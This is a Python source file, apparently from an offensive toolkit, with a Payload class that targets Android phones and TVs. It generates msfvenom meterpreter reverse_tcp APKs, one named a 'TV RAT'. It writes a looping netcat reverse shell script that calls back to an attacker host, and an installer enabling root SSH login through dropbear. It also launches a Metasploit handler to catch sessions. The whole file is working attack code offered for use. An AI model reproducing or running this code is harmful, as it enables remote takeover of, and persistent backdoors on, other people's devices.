import subprocess
import os
from pathlib import Path
from typing import Optional

class Payload:
    def __init__(self, config: dict):
        self.config = config
        self.payload_config = config.get("payload", {})
        self.default_lhost = self.payload_config.get("lhost", "0.0.0.0")
        self.default_lport = self.payload_config.get("lport", 4444)
        self.output_dir = Path(self.payload_config.get("apk_export_path", "outputs/payloads")).parent
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def generate_apk(self, lhost: Optional[str] = None, lport: Optional[int] = None, output_path: Optional[str] = None) -> bool:
        if lhost is None:
            lhost = self.default_lhost
        if lport is None:
            lport = self.default_lport
        if output_path is None:
            output_path = str(self.output_dir / "generated.apk")
        payload_type = self.payload_config.get("type", "meterpreter/reverse_tcp")
        platform = self.payload_config.get("msfvenom_platform", "android")
        extra_args = self.payload_config.get("extra_args", "")
        cmd = [
            "msfvenom",
            "-p", f"{platform}/{payload_type}",
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-o", output_path
        ]
        if extra_args:
            cmd.extend(extra_args.split())
        try:
            subprocess.run(cmd, check=True, capture_output=True, text=True)
            return os.path.exists(output_path)
        except subprocess.CalledProcessError:
            return False

    def generate_reverse_shell(self, lhost: str, lport: int, output_path: str = "outputs/payloads/reverse_shell.sh") -> bool:
        output_path_obj = Path(output_path)
        output_path_obj.parent.mkdir(parents=True, exist_ok=True)
        script_content = f"""#!/system/bin/sh
while true; do
    nc {lhost} {lport} -e /system/bin/sh
    sleep 5
done
"""
        try:
            with open(output_path_obj, "w") as f:
                f.write(script_content)
            os.chmod(output_path_obj, 0o755)
            return True
        except Exception:
            return False

    def generate_ssh_installer(self, lhost: str, lport: int = 22, output_path: str = "outputs/payloads/sshd_installer.sh") -> bool:
        output_path_obj = Path(output_path)
        output_path_obj.parent.mkdir(parents=True, exist_ok=True)
        script_content = f"""#!/system/bin/sh
mkdir -p /data/data/com.termux/files/usr/etc/ssh
echo "Port {lport}" > /data/data/com.termux/files/usr/etc/ssh/sshd_config
echo "PermitRootLogin yes" >> /data/data/com.termux/files/usr/etc/ssh/sshd_config
dropbear -p {lport} -R
"""
        try:
            with open(output_path_obj, "w") as f:
                f.write(script_content)
            os.chmod(output_path_obj, 0o755)
            return True
        except Exception:
            return False

    def generate_tv_rat(self, lhost: str, lport: int, output_path: str = "outputs/payloads/tv_rat.apk") -> bool:
        return self.generate_apk(lhost, lport, output_path)

    def start_msf_handler(self, lhost: str = None, lport: int = None) -> subprocess.Popen:
        if lhost is None:
            lhost = self.default_lhost
        if lport is None:
            lport = self.default_lport
        resource_content = f"""
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j -z
"""
        resource_path = Path("/tmp/msf_handler.rc")
        with open(resource_path, "w") as f:
            f.write(resource_content)
        return subprocess.Popen(["msfconsole", "-r", str(resource_path)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def get_payload_info(self) -> dict:
        return {
            "default_lhost": self.default_lhost,
            "default_lport": self.default_lport,
            "payload_type": self.payload_config.get("type", "meterpreter/reverse_tcp"),
            "platform": self.payload_config.get("msfvenom_platform", "android")
        }